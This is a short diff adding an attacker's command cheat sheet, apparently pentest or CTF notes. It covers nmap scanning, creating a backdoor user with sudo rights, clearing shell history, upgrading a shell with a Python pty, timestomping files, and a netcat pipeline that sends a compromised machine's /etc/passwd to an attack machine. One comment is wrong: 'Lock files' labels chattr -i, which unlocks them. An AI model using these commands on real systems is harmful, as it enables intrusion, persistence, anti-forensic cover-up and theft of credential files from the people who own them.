@@ -1,0 +1,32 @@
+# Host discovery
+nmap -sP ip
+
+# Open ports, -sV for more detail / less speed
+nmap -T4 -sV ip
+
+# Add user:
+sudo adduser username
+
+# Sudo priv to new user:
+sudo usermod -aG sudo username
+
+# Lock files:
+sudo chattr -i /etc/passwd
+
+# Clear history: 
+sudo history -c
+
+# Upgrade shells:
+python -c 'import pty; pty.spawn("/bin/bash")'  
+
+# Change time:
+sudo touch -a -m -t YYYYMMDDHHMM.SS filename
+
+# Change password:
+sudo passwd username
+
+#Netcat file transfer
+#Compromised machine: 
+tar -zcf - etc/passwd | pv | nc -l -p 5555 -q -5
+#Attack machine: 
+nc -w 3 192.168.225.131 5555 | tar -zxf -
